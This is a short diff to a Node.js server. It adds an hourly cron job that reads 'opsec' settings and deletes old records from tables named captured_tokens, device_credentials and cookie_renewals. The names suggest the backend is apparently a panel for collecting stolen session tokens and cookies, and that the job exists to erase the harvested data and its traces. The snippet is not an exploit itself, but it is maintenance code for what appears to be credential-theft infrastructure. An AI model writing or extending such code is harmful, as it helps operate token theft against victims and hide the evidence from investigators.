@@ -577,6 +577,35 @@ cron.schedule('*/5 * * * *', async () => {
   }
 });
 
+// --- Auto cleanup of old/orphaned data ---
+const { getOpsecSettings } = require('./backend/middleware/opsec');
+cron.schedule('0 * * * *', async () => {
+  try {
+    const settings = await getOpsecSettings();
+    if (settings.auto_cleanup !== 'true') return;
+    const retention = parseInt(settings.token_retention_days, 10) || 30;
+    const [oldTokens] = await db.query(
+      `DELETE FROM captured_tokens WHERE created_at < DATE_SUB(NOW(), INTERVAL ? DAY) AND deleted = 0`,
+      [retention]
+    );
+    const [orphanCredentials] = await db.query(
+      `DELETE FROM device_credentials WHERE user_id NOT IN (SELECT id FROM users)`
+    );
+    let orphanRenewals = { affectedRows: 0 };
+    if (settings.delete_orphans === 'true') {
+      [orphanRenewals] = await db.query(
+        `DELETE FROM cookie_renewals WHERE capture_id NOT IN (SELECT id FROM captured_tokens)`
+      );
+    }
+    const total = (oldTokens.affectedRows || 0) + (orphanCredentials.affectedRows || 0) + (orphanRenewals.affectedRows || 0);
+    if (total > 0) {
+      console.log(`[CRON] Auto cleanup removed ${total} records`);
+    }
+  } catch (err) {
+    console.error('[CRON] Auto cleanup error:', err.message);
+  }
+});
+
 // --- Error Handler ---
 app.use((err, req, res, next) => {
   console.error('[ERROR]', err.message);
